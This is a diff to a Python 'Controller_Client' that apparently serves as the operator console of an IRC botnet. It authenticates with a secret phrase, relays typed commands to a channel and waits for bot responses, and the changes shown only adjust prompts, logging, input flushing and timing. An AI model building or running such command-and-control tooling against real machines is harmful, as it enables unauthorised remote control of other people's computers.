@@ -21,26 +21,29 @@ class Controller_Client:
         connected, self.irc_socket = self.__attempt_connection(5)
         if connected:
             self.send_to_channel(self.secret_phrase)
+            text = self.get_text()
+            if text != "":
+                self.log(text)
+            self.log("Please enter the command you wish to execute: ")
         while connected:
             # executes if there is input to be read in
             #TODO could make this an IF but might not work for multiple lines/large input?
-            # tcflush(sys.stdin, TCIFLUSH) # flush input buffer while command was being tested
             while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                 command = sys.stdin.readline()
                 if command:
                     self.__send_command(command)
-                    print("waiting for user input")
+                    tcflush(sys.stdin, TCIFLUSH) # flush the input buffer after executing
+                    self.log("\nPlease enter the command you wish to execute: ")
                 else: # an empty line means stdin has been closed
                     raise Exception("stdin has closed unexpectedly")
             # executes if there is no input to be read in
             else:
                 text = self.get_text()
-                if text != "":
-                    self.log(text)
 
         self.irc_socket.close()
     
     # prompts the user to enter input in order to execute command
+    #TODO delete if I don't end up needing it
     def __prompt_command(self):
         tcflush(sys.stdin, TCIFLUSH) # flush input buffer while command was being tested
         return input("Please enter the command you wish to execute: ").strip()
@@ -51,19 +54,18 @@ class Controller_Client:
             self.__terminate()
         else:
             self.send_to_channel(command)
-        timeout = 5 # timeout (in seconds)
-        timeout_start = time.time()
         self.log("Waiting for responses...")
-        while time.time() < timeout_start + timeout:
-            pass
+        time.sleep(5)
         response = self.get_text() # get response from bots
         # self.log("bot response: \n" + response)
         # self.log("done")
 
         # check if msg is a DM
-        self.__handle_response(command, response)
+        if not self.__handle_response(command, response):
+            self.log("No Response")
 
     # receives and handles the response from the bots
+    # returns True if command is recognizable, false otherwise
     def __handle_response(self, command, response):
         command = command.split()
         if len(command) <= 0:
@@ -162,7 +164,7 @@ class Controller_Client:
 
     # function for logging messages
     def log(self, message):
-        print(message.strip("\n"))
+        print(message)#.strip("\n"))
 
     # functions to send/recv raw messages from IRC server
     def send_msg(self, message):
